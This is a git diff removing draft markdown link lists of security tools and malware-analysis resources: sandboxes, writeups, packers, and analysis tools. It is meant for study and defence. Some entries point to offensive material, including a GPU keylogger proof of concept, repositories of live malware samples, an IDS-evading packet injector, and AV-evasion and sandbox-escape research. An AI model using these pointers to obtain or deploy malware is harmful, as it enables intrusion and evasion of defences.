-	* This tool processes Sysinternals Process Monitor (Procmon) logfiles and PCAP-logs (Windump, Tcpdump) to generate a graph via the GraphViz suite. This graph visualizes any relevant activities (customizable) and can be interactively analyzed.
-
-
-Local
-* [Foreign LINUX](https://github.com/wishstudio/flinux)
-	* Foreign LINUX is a dynamic binary translator and a Linux system call interface emulator for the Windows platform. It is capable of running unmodified Linux binaries on Windows without any drivers or modifications to the system. This provides another way of running Linux applications under Windows in constrast to Cygwin and other tools.
-
-Network 
-* [Netdude](http://netdude.sourceforge.net/)
-	* The Network Dump data Displayer and Editor is a framework for inspection, analysis and manipulation of tcpdump trace files. It addresses the need for a toolset that allows easy inspection, modification, and creation of pcap/tcpdump trace files. Netdude builds on any popular UNIX-like OS, such as Linux, the BSDs, or OSX.
-
-Programming Related
-* [Hachoir](https://bitbucket.org/haypo/hachoir/wiki/Home)
-	* Hachoir is a Python library that allows to view and edit a binary stream field by field
-
-* [pdf-bot](https://github.com/esbenp/pdf-bot)
-	* ?? A Node queue API for generating PDFs using headless Chrome. Comes with a CLI, S3 storage and webhooks for notifying subscribers about generated PDFs
-* [exitmap](https://github.com/NullHypothesis/exitmap)
-	* A fast and modular scanner for Tor exit relays. 
-* [SniffJoke](https://github.com/vecna/sniffjoke)
-	* SniffJoke is an application for Linux that handle transparently your TCP connection, delaying, modifyng and inject fake packets inside your transmission, make them almost impossible to be correctly readed by a passive wiretapping technology (IDS or sniffer)
-* [Unicorn-Engine](http://www.unicorn-engine.org/)
-	* Unicorn is a lightweight multi-platform, multi-architecture CPU emulator framework.
-* [Distributed File Storage Using JavaScript Botnets](https://github.com/seantmalone/HiveMind)
-
-Other
-* [ZeroMQ](http://zguide.zeromq.org/page:all)
-* [recap](https://github.com/rackerlabs/recap)
-	* recap is a reporting script that generates reports of various information about the server.
-* [LuxBase](https://github.com/kienankb/LuxBase)
-* [Delta Copy](http://www.aboutmyip.com/AboutMyXApp/DeltaCopy.jsp)
-	* In technical terms, DeltaCopy is a "Windows Friendly" wrapper around the Rsync program, currently maintained by Wayne Davison. "rsync" is primarily designed for Unix/Linux/BSD systems. Although ports are available for Windows, they typically require downloading Cygwin libraries and manual configuration. 
-* [autojump - a faster way to navigate your filesystem](https://github.com/wting/autojump)
-	* autojump is a faster way to navigate your filesystem. It works by maintaining a database of the directories you use the most from the command line.
-* [Universal Extractor](http://www.legroom.net/software/uniextract)
-	* Universal Extractor is a program designed to decompress and extract files from any type of archive or installer, such as ZIP or RAR files, self-extracting EXE files, application installers, etc 
-
-
-Personal Utilities
-* [CyberChef - GCHQ](https://github.com/gchq/CyberChef)
-	* CyberChef is a simple, intuitive web app for carrying out all manner of "cyber" operations within a web browser. These operations include simple encoding like XOR or Base64, more complex encryption like AES, DES and Blowfish, creating binary and hexdumps, compression and decompression of data, calculating hashes and checksums, IPv6 and X.509 parsing, changing character encodings, and much more.
-* [WizTree](http://www.majorgeeks.com/files/details/wiztree.html)
-	* WizTree is a disk space analyzer that will quickly scan your entire hard drive and shows you which files and folders are using the most disk space. WizTree obtains information by directly scanning the MFT file, so it can only work with local (directly attached) drives formatted with the NTFS file system. It won't work with network drives, substituted drives or non-NTFS formatted drives. We may add support for other drive types in the future if there's enough demand.
-* [Xmount](https://www.pinguin.lu/xmount)
-	* What is xmount? xmount allows you to convert on-the-fly between multiple input and output harddisk image types. xmount creates a virtual file system using FUSE (Filesystem in Userspace) that contains a virtual representation of the input image. The virtual representation can be in raw DD, DMG, VHD, VirtualBox's virtual disk file format or in VmWare's VMDK file format. Input images can be raw DD, EWF (Expert Witness Compression Format) or AFF (Advanced Forensic Format) files. In addition, xmount also supports virtual write access to the output files that is redirected to a cache file. This makes it possible to boot acquired harddisk images using QEMU, KVM, VirtualBox, VmWare or alike.
-* [HashID](https://github.com/psypanda/hashID)
-	* hashID is a tool written in Python 3 which supports the identification of over 220 unique hash types using regular expressions. It is able to identify a single hash, parse a file or read multiple files in a directory and identify the hashes within them. hashID is also capable of including the corresponding hashcat mode and/or JohnTheRipper format in its output. hashID works out of the box with Python 2 = 2.7.x or Python 3 = 3.3 on any platform.
-* [gibbersense](https://github.com/smxlabs/gibbersense)
-	* Extract Sense out of Gibberish stuff
-* [algo](https://github.com/trailofbits/algo)
-	* 1-click IPSEC VPN in the Cloud 
-* [cyberfree](https://github.com/arnaudsoullie/cyberfree)
-	* Cyber-free browsing extension for Chrome
-
-
-Editors
-* [wxHex Editor](http://www.wxhexeditor.org/home.php)
-	* wxHexEditor is another Free Hex Editor, build because there is no good hex editor for Linux system, specially for big files.
-
-
-GPU Keylogger
-* [Demon](https://github.com/x0r1/Demon)
-	* GPU keylogger PoC by Team Jellyfish
-
-
-* [FreeIPA]()
-	* FreeIPA is an integrated security information management solution combining Linux (Fedora), 389 Directory Server, MIT Kerberos, NTP, DNS, Dogtag (Certificate System). It consists of a web interface and command-line administration tools. FreeIPA is an integrated Identity and Authentication solution for Linux/UNIX networked environments. A FreeIPA server provides centralized authentication, authorization and account information by storing data about user, groups, hosts and other objects necessary to manage the security aspects of a network of computers. 
-
-
-Scraping/Archiving
-* [wikiteam](https://github.com/WikiTeam/wikiteam)
-	* Tools for downloading and preserving wikis 
-* [Paste-Scraper](https://github.com/KernelEquinox/Paste-Scraper)
-* [Wayback scraper](https://github.com/abrenaut/waybackscraper)
-* [Webrecorder](https://webrecorder.io/)
-	* Create high-fidelity, interactive web archives of any web site you browse
diff --git a/Draft/Malware.md b/Draft/Malware.md
deleted file mode 100755
index 7322766..0000000
--- a/Draft/Malware.md
+++ /dev/null
@@ -1,422 +0,0 @@
-##Malware
-
-TOC
-* [General](#general)
-* [Tutorials](#tutorial)
-* [Writeups](#writeup)
-* [Malware Repositories](#repository)
-* [Mobile}(#mobile)
-* [Anti-VM/Detecting VMs](#antivm)
-* [Tools](#tools)
-* [Static Analysis](#static)
-* [Dynamic Analysis](#dynamic)
-* [AV Evasion/Encoders/Packers](#packers]()
-* [Papers](#papers)
-* [Talks](#talks)
-* [Other](#other)
-
-
-
-
-##### Sort
-* sort tools
-* Add malicious document section
-http://securityxploded.com/malware-analysis-training-reference.php
-
-http://www.malwarearchaeology.com/mmf/
-
-https://motherboard.vice.com/read/preserving-the-ancient-art-of-getting-pwned
-
-http://www.exposedbotnets.com/?m=0
-
-https://brycampbell.co.uk/new-blog/
-https://archive.is/Nol3S
-Add
-* Stuxnet
-* Duqu
-* Flame
-* Itaduke
-* Packers
-	* mew
-	* ASPROTECT
-	* UPX
-	* FSG
-	* PESpin
-
-* [IcoScript: using webmail to control malware](https://www.virusbulletin.com/virusbulletin/2014/08/icoscript-using-webmail-control-malware)
-* [fastfluxanalysis](https://github.com/staaldraad/fastfluxanalysis)
-	* Scripts to detect Fast-Flux and DGA using DNS query responses
-* [Interesting Malware - No, I’m not kidding... by Marion Marschalek](https://www.youtube.com/watch?v=u2Ry9HTBbZI)
-* [rVMI - A New Paradigm For Full System Analysis](https://github.com/fireeye/rvmi)
-	* rVMI is a debugger on steroids. It leverages Virtual Machine Introspection (VMI) and memory forensics to provide full system analysis. This means that an analyst can inspect userspace processes, kernel drivers, and preboot environments in a single tool.  It was specifially designed for interactive dynamic malware analysis. rVMI isolates itself from the malware by placing its interactive debugging environment out of the virtual machine (VM) onto the hypervisor-level. Through the use of VMI the analyst still has full control of the VM, which allows her to pause the VM at any point in time and to use typical debugging features such as breakpoints and watchpoints. In addtion, rVMI provides access to the entire Rekall feature set, which enables an analyst to inspect the kernel and its data structures with ease.
-
-* [PyTrigger: A System to Trigger & Extract User-Activated Malware Behavior](http://cs.gmu.edu/~astavrou/research/PyTrigger_ARES2013.pdf)
-	* Abstract: We introduce PyTrigger, a dynamic malware analy- sis system that automatically exercises a malware binary extract- ing its behavioral profile even when specific user activity or input is required. To accomplish this, we developed a novel user activity record and playback framework and a new  behavior  extraction approach.  Unlike  existing research, the activity recording and playback  includes the context of every object  in  addition  to traditional keyboard and mouse actions. The addition of the con- text makes the playback more accurate and avoids dependenciesand pitfalls that come with pure mouse and keyboard  replay. Moreover,  playback  can  become  more  efficient by condensing common activities into a single action. After playback, PyTrigger analyzes the system trace using a combination of multiple states and  behavior  differencing  to accurately extract  the  malware behavior and user triggered behavior from the complete system trace  log.  We  present the  algorithms, architecture and evaluate the   PyTrigger prototype using 3994 real malware samples. Results and analysis are presented showing PyTrigger extracts additional behavior in 21% of the samples
-
-
-[Windows’ PsSetLoadImageNotifyRoutine Callbacks: the Good, the Bad and the Unclear (Part 2)](https://breakingmalware.com/documentation/windows-pssetloadimagenotifyroutine-callbacks-good-bad-unclear-part-2/)
-
-##### END Sort
-
-
-
-
-
-
-##### To Do
-* Sort Tools
-* Clean up/organize
-
-
-
-
-### <a name="general"></a>First Section
-* [Awesome Malware Analysis - Github Awesome List series](https://github.com/rshipp/awesome-malware-analysis)
-* [TIPS FOR REVERSE - ENGINEERING MALICIOUS CODE - Lenny Zeltser](https://zeltser.com/media/docs/reverse-engineering-malicious-code-tips.pdf)
-* [List of autorun keys / malware persistence Windows registry entries](https://www.peerlyst.com/posts/list-of-autorun-keys-malware-persistence-windows-registry-entries-benjamin-infosec)
-* [Computer Viruses In This Modern Age - alcopaul/brigada ocho 2014](http://spth.virii.lu/dc6/TEXTS/alcopaul/virus_alcopaul.txt)
-
-
-
-### <a name="tutorial">Tutorials</a>
-Analysis 101
-* [Reverse Engineering Malware 101 Material - Malware Unicorn](https://securedorg.github.io/RE101/)
-* [Malware Analysis Tutorials: a Reverse Engineering Approach - Dr Xiang Fu](https://fumalwareanalysis.blogspot.com/p/malware-analysis-tutorials-reverse.html)
-* [Malware Analysis Tutorials: a Reverse Engineering Approach](http://fumalwareanalysis.blogspot.com/p/malware-analysis-tutorials-reverse.html)
-* [Malware Analysis 101 - N00b to Ninja in 60 Minutes at CactusCon on April 4, 2014](https://www.slideshare.net/grecsl/malware-analysis-101-n00b-to-ninja-in-60-minutes-at-cactuscon-on-april-4-2014)
-
-
-Making an Analysis Box
-* [Creating a Malware Sandbox in Seconds with Noriben.](http://www.ghettoforensics.com/2016/01/creating-malware-sandbox-in-seconds.html?m=1)
-* [Building a Home Lab to Become a Malware Hunter - A Beginner’s Guide](https://www.alienvault.com/blogs/security-essentials/building-a-home-lab-to-become-a-malware-hunter-a-beginners-guide)
-* [Cuckoo Sandbox Hardening(2013)](http://0xmalware.blogspot.com/2013/10/cuckoo-sandbox-hardening-virtualbox.html)
-* [Awesome Guide to building a VM for anonymous Malware Analysis and Reverse Engineering](https://www.codeandsec.com/Building-Ultimate-Anonymous-Malware-Analysis-and-Reverse-Engineering-Machine)
-* [malboxes](https://github.com/GoSecure/malboxes)
-	* Builds malware analysis Windows VMs so that you don't have to.
-* [Advanced Desktop Application Sandboxing via AppContainer](https://www.malwaretech.com/2015/09/advanced-desktop-application-sandboxing.html)
-* Sandboxes
-	* [Limon - Sandbox for Analyzing Linux Malwares](https://github.com/monnappa22/Limon)
-* [Truman](http://www.secureworks.com/cyber-threat-intelligence/tools/truman/)
-	* Truman can be used to build a "sandnet", a tool for analyzing malware in an environment that is isolated, yet provides a virtual Internet for the malware to interact with. It runs on native hardware, therefore it is not stymied by malware which can detect VMWare and other VMs. The major stumbling block to not using VMs is the difficulty involved with repeatedly imaging machines for re-use. Truman automates this process, leaving the researcher with only minimal work to do in order to get an initial analysis of a piece of malware. Truman consists of a Linux boot image (originally based on Chas Tomlin's Windows Image Using Linux) and a collection of scripts. Also provided is pmodump, a Perl-based tool to reconstruct the virtual memory space of a process from a PhysicalMemory dump. With this tool it is possible to circumvent most packers to perform strings analysis on the dumped malware.
-General Tutorials
-* [A Guide to Malware Binary Reconstruction](https://github.com/0xAX/linux-insides/blob/master/Misc/contribute.md)
-* [Automating Removal of JS Obfuscators](http://www.contextis.com/resources/blog/automating-removal-java-obfuscation/)
-	* In this post we detail a method to improve analysis of Java code for a particular obfuscator, we document the process that was followed and demonstrate the results of automating our method. Obscurity will not stop an attacker and once the method is known, methodology can be developed to automate the process. 
-* [DIY Android Malware Analysis with OBAD](http://securityintelligence.com/diy-android-malware-analysis-taking-apart-obad-part-1/)
-* [ ZeroAccess Malware - Part 1 De-Obfuscating and Reversing the User-Mode Agent Dropper](http://resources.infosecinstitute.com/step-by-step-tutorial-on-reverse-engineering-malware-the-zeroaccessmaxsmiscer-crimeware-rootkit/)
-
-
-
-
-
-
-
-
-
-### <a name="writeup">General/Writeups</a>
-* [Analyzing unknown malware blogpost series](http://thegoldenmessenger.blogspot.com/)
-
-Android
-* [How To Dissect Android Flappy Bird Malware](http://securehoney.net/blog/how-to-dissect-android-flappy-bird-malware.html)
-* [Hacking Team Writeup](https://citizenlab.org/2014/06/backdoor-hacking-teams-tradecraft-android-implant/)
-* [Android/Beita.A malware analysis](http://www.jamesejr.com/android-beita-malware-analysis/)
-* Analysis
-	* Static
-	* Dynamic
-		* [Android Sandbox V1](http://androidsandbox.net/)
-			* Automated Malware Analysis
-		* [Cuckoo-Droid](https://github.com/i[danr1986/cuckoo-droid/blob/master/README.md)
-			* CuckooDroid is an extension of Cuckoo Sandbox the Open Source software for automating analysis of suspicious files, CuckooDroid brigs to cuckoo the capabilities of execution and analysis of android application.
-* Obfuscators
-	* [ProGuard](http://proguard.sourceforge.net/)
-	* [DexGuard](http://www.saikoa.com/dexguard)
-	* [Obfuscation in Android malware, and how to fight back](https://www.virusbtn.com/virusbulletin/archive/2014/07/vb201407-Android-obfuscation)
-	* [Obfuscation in Android Malware and how to fight back](https://www.virusbtn.com/virusbulletin/archive/2014/07/vb201407-Android-obfuscation)
-* De-Obfuscators
-	* [De-hoser](https://github.com/strazzere/dehoser)
-		* Unpacker for the HoseDex2Jar APK Protection which packs the original file inside the dex header
-	* [hidex](https://github.com/cryptax/dextools/tree/master/hidex)
-		* hides or reveals a given method in a DEX file
-	* [Android Unpacker presented at Defcon 22: Android Hacker Protection Level 0](https://github.com/strazzere/android-unpacker)
-		* native-unpacker/ - Unpacker for APKProtect/Bangcle/LIAPP/Qihoo Packer that runs natively, no dependency on gdb
-		* hide-qemu/ - Small hacks for hiding the qemu/debuggers, specifically from APKProtect
-* Packers
-	* [Android Packers](http://www.fortiguard.com/uploads/general/Area41Public.pdf)
-
-
-
-
-
-APTs
-* [Clean up on Aisle APT - Mark Parsons](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t101-clean-up-on-aisle-apt-mark-parsons)
-	* This presentation will discuss findings from running multiple sinkholes over the past year. I have purchased multiple domains associated with 'APT' activity after the domains have expired. I will discuss initial expectations before beginning this journey and then discuss actual results and findings. To assist other researchers, suggestions and lessons learned from this experiment will be shared.
-* [Decoding ZeuS disguised as an .RTF File](http://phishme.com/decoding-zeus-disguised-as-an-rtf-file/)
-	* Excellent step by step writeup
-* [FinFisher Malware Dropper Analysis](https://www.codeandsec.com/FinFisher-Malware-Dropper-Analysis)
-* [North Korean Malware Writeup](https://www.codeandsec.com/Supreme-Leaders-Not-That-Supreme-Malwares)
-* [Regin Malware writeup by F-Secure](https://www.f-secure.com/weblog/archives/00002774.html)
-* [Fanny Malware Writeup](https://securelist.com/blog/research/68787/a-fanny-equation-i-am-your-father-stuxnet/)	
-* [The DUQU 2.0 Technical Details - Kaspersky](https://cdn.securelist.com/files/2015/06/The_Mystery_of_Duqu_2_0_a_sophisticated_cyberespionage_actor_returns.pdf)
-* [Unmasking Careto through Memory Analysis - Andrew Case](http://2014.video.sector.ca/video/110388398)
-[Hacking FinSpy - a Case Study - Atilla Marosi - [TROOPERS15]](https://www.youtube.com/watch?v=Mb4mfBi06K4)
-* FinFisher - CodeandSec
-	* [Part 1](https://www.codeandsec.com/FinFisher-Malware-Dropper-Analysis)
-	* [Part 2](https://www.codeandsec.com/FinFisher-Malware-Analysis-Part-2)
-	* [Part 3](https://www.codeandsec.com/FinFisher-Malware-Analysis-Part-3)
-* [To Catch a Spy Tyler Hudak - Derbycon7](https://www.youtube.com/watch?v=usyCWf3gsQ4)
-* [ZitMo NoM - Derbycon2014](https://www.irongeek.com/i.php?page=videos/derbycon4/t520-zitmo-nom-david-schwartzberg)
-	* A world without malware is ideal but unlikely. Many of us would prefer *not* to install another layer of protection on their already resource constrained handheld mobile device. Alternatively, Android malware detection sans anti-virus installation has become a reality. Learn about how it’s possible to detect mobile malware using simple text messages with ZitMo NoM. ZeuS in the mobile, known as ZitMo, is infamous for intercepting SMS transmissions then redirecting them to a Command & Control in order steal banking and personal information. Research with SMS transmissions directed at mobile malware has resulted in the ability to detect ZitMo’s presence without anti,virus applications installed. Turning their own tools against them makes this even more of a rewarding endeavor. We are looking for malware researchers to contribute to the continued development of this open tool. The presentation will include the research, the infrastructure and a demonstration of ZitMo NoM. Live malware will be used during this presentation, assuming we get it to behave.
-* [Malware: From your text editor, to the United States Government's Lab (SHA2017)](https://www.youtube.com/watch?v=PtufumVvN-E)
-	* How Universities in the US collaborate with the United States Government to make America stronger, and the rest weaker. Ever wonder where your malware ends up after you deploy it? Are you curious how the United States Government researches Cyber Security on the backs of students? First, this is not a technical talk. This is an informative talk on the insides of how the inner workings of an Information Security Lab in one of the Top Technical Universities in the United States works with its Government to provide insights in the world of, as the feds like to call it, "CyberSecurity". (All Americans apologize for Trump. We're sorry.)
-* [Keep Calm and (Don’t) Enable Macros: A New Threat Actor Targets UAE Dissidents](https://citizenlab.org/2016/05/stealth-falcon/)
-* Axiom Threat Actor Group Report
-	* [Executive Summary](http://www.novetta.com/files/9714/1446/8199/Executive_Summary-Final_1.pdf)
-
-
-
-
-AV
-* [Escaping The Avast Sandbox Using A Single IOCTL](https://www.nettitude.co.uk/escaping-avast-sandbox-using-single-ioctl-cve-2016-4025)
-* [AVLeak: Fingerprinting Antivirus Emulators Through Black-Box Testing](https://www.usenix.org/system/files/conference/woot16/woot16-paper-blackthorne_update.pdf)
-
-
-
-Botnets
-* [Case study of the miner botnet](http://pnx.tf/files/2012_cycon-official_miner_plohmann_padilla.pdf)
-* [Analysis of a Romanian Botnet](http://www.politoinc.com/2015/04/analysis-of-a-romanian-botnet/)
-	* Going from first sighting in logs to tracing attackers to their C2 IRC room
-* [A timeline of mobile botnets](https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-mobile-botnets) 
-	* With the recent explosion in smartphone usage, malware authors have increasingly focused their attention on mobile devices, leading to a steep rise in mobile malware over the past couple of years. In this paper, Ruchna Nigam focuses on mobile botnets, drawing up an inventory of types of known mobile bot variants.
-
-
-C2 Infrastructure
-* [Dead RATs: Exploiting malware C2 servers](https://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware)
-* [Hiding in Plain Sight: Advances in malware covert communication channels - BH2015 Pierre-Marc Bureau, Christian Dietrich](https://www.blackhat.com/docs/eu-15/materials/eu-15-Bureau-Hiding-In-Plain-Sight-Advances-In-Malware-Covert-Communication-Channels-wp.pdf)
-
-
-Dynamic Analysis
-* [Unicorn VS. Malware](https://r3v3rs3r.wordpress.com/2015/12/12/unicorn-vs-malware/)
-* [Dynamic Anti-Emulation using Blackbox Analysis by Second Part To Hell](http://spth.virii.lu/dynamic_anti_emulation.txt)
-* Tools
-	* [DRAKVUF](https://tklengyel.github.io/drakvuf/)
-		* DRAKVUF is an agentless dynamic malware analysis system built on Xen, LibVMI, Volatility and Rekall. It allows for in-depth execution tracing of malware samples and extracting deleted files from memory, all without having to install any special software within the virtual machine used for analysis.
-		* [Code](https://github.com/tklengyel/drakvuf)
-	* [Zero Wine](http://zerowine.sourceforge.net/)
-		* Zero wine is an open source (GPL v2) research project to dynamically analyze the behavior of malware. Zero wine just runs the malware using WINE in a safe virtual sandbox (in an isolated environment) collecting information about the APIs called by the program.
-	* [Honeyagent](https://bitbucket.org/fkie_cd_dare/honeyagent)
-		* HoneyAgent is a Java agent library that creates a Sandbox for Java applications and applets. Therefore, it uses the JVMTI as well as the JNI to intercept class loading and function calls. During runtime HoneyAgent traces function calls from the analysed application. It is displayed which class calles which function with which parameters. Reflected function calls are translated to the origin function names for simpler reading.
-	* [Pybox](https://bitbucket.org/daniel_plohmann/pybox/)
-		* user-level framework for monitoring processes
-		* [Research paper on it](https://eldorado.tu-dortmund.de/bitstream/2003/27336/1/BookOfAbstracts_Spring5_2010.pdf)
-	* [INetSim](http://www.inetsim.org/)
-		* INetSim is a software suite for simulating common internet services in a lab environment, e.g. for analyzing the network behaviour of unknown malware samples. 
-	* [Regshot](http://sourceforge.net/projects/regshot/)
-		* Regshot is an open-source (LGPL) registry compare utility that allows you to quickly take a snapshot of your registry and then compare it with a second one - done after doing system changes or installing a new software product.
-	* [Mandiant ApateDNS](https://www.mandiant.com/resources/download/research-tool-mandiant-apatedns)
-		* Mandiant ApateDNS is a tool for controlling DNS responses though an easy to use GUI. As a phony DNS server, Mandiant ApateDNS spoofs DNS responses to a user-specified IP address by listening on UDP port 53 on the local machine. Mandiant ApateDNS also automatically sets the local DNS to localhost. Upon exiting the tool, it sets back the original local DNS settings.
-	* [Malcom - Malware Communication Analyzer](https://github.com/tomchop/malcom)
-		* Malcom is a tool designed to analyze a system's network communication using graphical representations of network traffic, and cross-reference them with known malware sources. This comes handy when analyzing how certain malware species try to communicate with the outside world.
-	*[BasicHook](https://github.com/MalwareTech/BasicHook)
-		* x86 Inline hooking engine (using trampolines)
-	* [Claimsman](Claimsman logs all file handle creation on Windows systems, and logs to both a local file and centralized log management system.)
-	* [WinMerge](http://winmerge.org/)
-		* WinMerge is an Open Source differencing and merging tool for Windows. WinMerge can compare both folders and files, presenting differences in a visual text format that is easy to understand and handle.
-	* [API Monitor](http://www.rohitab.com/apimonitor)
-		* API Monitor is a free software that lets you monitor and control API calls made by applications and services. Its a powerful tool for seeing how applications and services work or for tracking down problems that you have in your own applications.
-	* [SpyStudio](http://www.nektra.com/products/spystudio-api-monitor/)
-		* SpyStudio shows and interprets calls, displaying the results in a structured way which is easy for any IT professional to understand. SpyStudio can show registry keys and files that an application uses, COM objects and Windows the application has created, and errors and exceptions.
-	* [Microsoft Message Analyzer](http://www.microsoft.com/en-us/download/details.aspx?id=40308)
-		* Microsoft Message Analyzer is a new tool for capturing, displaying, and analyzing protocol messaging traffic and other system messages. Message Analyzer also enables you to import, aggregate, and analyze data from log and trace files. It is the successor to Microsoft Network Monitor 3.4 and a key component in the Protocol Engineering Framework (PEF) that was created by Microsoft for the improvement of protocol design, development, documentation, testing, and support. With Message Analyzer, you can choose to capture data live or load archived message collections from multiple data sources simultaneously.
-	* [PyTrigger: A System to Trigger & Extract User-Activated Malware Behavior](http://cs.gmu.edu/~astavrou/research/PyTrigger_ARES2013.pdf)
-		* Abstract: PyTrigger analyzes the system trace using a combination of multiple states and behavior differencing to accurately extract the malware behavior and user triggered behavior from the complete system trace log. We present the algorithms, architecture and evaluate the PyTrigger prototype using 3994 real malware samples. Results and analysis are presented showing PyTrigger extracts additional behavior in 21% of the samples.
-
-
-
-Embedded
-* [Analyzing Malware for Embedded Devices: TheMoon Worm](http://w00tsec.blogspot.com/2014/02/analyzing-malware-for-embedded-devices.html)
-
-
-
-Exploit Kits
-* [How exploit packs are concealed in a Flash object](https://securelist.com/analysis/publications/69727/how-exploit-packs-are-concealed-in-a-flash-object/?utm_content=buffer5de59&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer)
-* [RIG Exploit Kit Writeup](https://www.trustwave.com/Resources/SpiderLabs-Blog/RIG-Exploit-Kit-%E2%80%93-Diving-Deeper-into-the-Infrastructure/)
-* [The Economics of Exploit Kits & E-Crime](http://www.irongeek.com/i.php?page=videos/bsidescolumbus2016/offense03-the-economics-of-exploit-kits-e-crime-adam-hogan)
-	* I will discuss how the market for exploit kits has been changing, in techniques, marketing and prices. I argue that the competitiveness between exploit kits shows a maturing market, but will leverage economic theory to demonstrate the limits to which that market will continue to mature. This should allow us to understand how exploit kits affect (and are affected by) the rest of the greater market for hacker services, from malware (as an input) to nation-state level attacks (e.g. trickle down from Hacking Team). I hope to provide a better understanding of how exploit kits work and how their sold as well as how this market can teach us about the rational choice to engage in criminal activity and how we might dissuade them.
-
-
-Hashing
-* [binwally](https://github.com/bmaia/binwally)
-	* [Binary and Directory tree comparison tool using the Fuzzy Hashing concept (ssdeep)](http://w00tsec.blogspot.com/2013/12/binwally-directory-tree-diff-tool-using.html)
-* [Ssdeep](http://ssdeep.sourceforge.net/)
-	* static malware comparison tool - ssdeep is a program for computing context triggered piecewise hashes (CTPH). Also called fuzzy hashes, CTPH can match inputs that have homologies. Such inputs have sequences of identical bytes in the same order, although bytes in between these sequences may be different in both content and length.
-
-
-
-iOS
-
-
-General Analysis
-* [PortEX: Robust static anaylsis of Portable Executable Malware](https://evilzone.org/reverse-engineering/%28pdf%29-robust-static-analysis-of-portable-executable-malware/)
-
-General
-* [Malvertising: Under The Hood by Chris Boyd - BSides Manchester2017](https://www.youtube.com/watch?v=VESvOsr91_M&index=1&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
-
-Hunting Down Malware
-* [License to Kill: Malware Hunting with the Sysinternals Tools](https://channel9.msdn.com/Events/TechEd/NorthAmerica/2013/ATC-B308)
-
-
-Mac
-* [Writing Bad @$$ Malware for OS X - Patrick Wardle](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)
-* [Offensive Malware Analysis: Dissecting OSX FruitFly - Patrick Wardle - DEF CON 25](https://www.youtube.com/watch?v=q7VZtCUphgg)
-	* FruitFly, the first OS X/macOS malware of 2017, is a rather intriguing specimen. Selectively targeting biomedical research institutions, it is thought to have flown under the radar for many years. In this talk, we'll focus on the 'B' variant of FruitFly that even now, is only detected by a handful of security products. We'll begin by analyzing the malware's dropper, an obfuscated perl script. As this language is rather archaic and uncommon in malware droppers, we'll discuss some debugging techniques and fully deconstruct the script.
-* [I got 99 Problems, but ?Little Snitch ain’t one! - Defcon2016](https://speakerdeck.com/patrickwardle/defcon-2016-i-got-99-problems-but-little-snitch-aint-one)
-
-Malware Repos
-* [The Zoo](https://github.com/ytisf/theZoo)
-	* A repository of LIVE malwares for your own joy and pleasure
-* [Mobile Malware dumps - Contagio](http://contagiominidump.blogspot.ca/)
-* [Ragpicker - Malware Crawler](https://code.google.com/p/malware-crawler/)
-	* Ragpicker is a Plugin based malware crawler with pre-analysis and reporting functionalities. Use this tool if you are testing antivirus products, collecting malware for another analyzer/zoo.
-Contagio/Contagio mobile
-* [Equation Group Malware Samples - ContagioDump](http://contagiodump.blogspot.com/2015/02/equation-samples-from-kaspersky-report.html)
-* [Objective-See Mac Malware Repo](https://objective-see.com/malware.html)
-
-
-
-Obfuscation
-* [Data Obfuscation: Now you see me... Now you don't...](http://malwageddon.blogspot.com/2015/03/data-obfuscation-now-you-see-me-now-you.html)
-	* This blog post shows how malware authors use Adobe Flash files to hide their creations' 'sensitive' data. I'll be using 2 recent Neutrino EK and 1 FlashPack malvertising samples to demonstrate it. In the case of Neutrino EK our goal will be extraction and decryption of its configuration file and in the malvertising case we'll be after the initial payload URL + exploit shellcode.
-
-
-Office Documents
-* [Loffice - Analyzing malicious documents using WinDbg](https://thembits.blogspot.com/2016/06/loffice-analyzing-malicious-documents.html)
-
-
-Online Checkers
-* [VirusTotal Mining](http://blog.9bplus.com/wp-content/uploads/2014/08/VirusTotal-Mining.pdf)
-* [Malice](https://github.com/maliceio/malice)
-	* Malice's mission is to be a free open source version of VirusTotal that anyone can use at any scale from an independent researcher to a fortune 500 company.
-* [Wepawet](https://wepawet.iseclab.org/)
-	* Wepawet is a free service, for non-commercial organizations, to detect and analyze web-based threats. It currently handles Flash, JavaScript, and PDF files
-* [IRMA - Incident Response & Malware Analysis](http://irma.quarkslab.com/index.html)
-	* IRMA intends to be an open-source platform designed to help identifying and analyzing malicious files.  However, today's defense is not only about learning about a file, but it is also getting a fine overview of the incident you dealt with: where / when a malicious file has been seen, who submitted a hash, where a hash has been noticed, which anti-virus detects it, ...  An important value with IRMA comes from you keep control over where goes / who gets your data. Once you install IRMA on your network, your data stays on your network.  Each submitted files is analyzed in various ways. For now, we focus our efforts on multiple anti-virus engines, but we are working on other "probes" (feel free to submit your own).
-
-
-
-(Un)Packers/Encoders
-* --> See 'Packers' section under 'Writeups' in RE
-* [Corkami - Packers](https://corkami.googlecode.com/files/packers.pdf)
-	* Beautiful.
-* [Stack Overflow RE -What are the different types of packers?](https://reverseengineering.stackexchange.com/questions/1779/what-are-the-different-types-of-packers)
-* [packer-breaker](http://www.sysreveal.com/category/packerbreaker/)
-	* Unpacker for a variety of packing tools.
-* [One packer to rule them all: Empirical identification, comparison and circumvention of current Antivirus detection techniques](http://www.arneswinnen.net/wp-content/uploads/2014/08/
-* [Deep dive into a custom malware packer](http://resources.infosecinstitute.com/deep-dive-into-a-custom-malware-packer/)
-* [Manually unpacking a Morphine-packed DLL with OllyDbg](http://www.joestewart.org/morphine-dll/)
-* [Paper on Manual unpacking of UPX packed executable using Ollydbg and Importrec](http://www.iosrjournals.org/iosr-jce/papers/Vol16-issue1/Version-1/L016117177.pdf)
-* [A study of the packer problem and its solutions](https://link.springer.com/chapter/10.1007/978-3-540-87403-4_6)
-* [Packer Analysis Report - Debugging and unpacking the NsPack 3.4 and 3.7 packer](https://www.sans.org/reading-room/whitepapers/malicious/packer-analysis-report-debugging-unpacking-nspack-34-37-packer-33428)
-WP-us-14-Mesbahi-Swinnen-One-packer-to-rule-them-all-Empirical-identification-comparison-and-circumvention-of-current-Antivirus-detection-techniques.pdf)
-* [Duping the machine: malware strategies, post Sandbox detection](https://www.virusbtn.com/pdf/conference_slides/2014/Wyke-VB2014.pdf)
-* [Locreate: An Anagram for Relocate ](http://uninformed.org/?v=all&a=30&t=sumry)
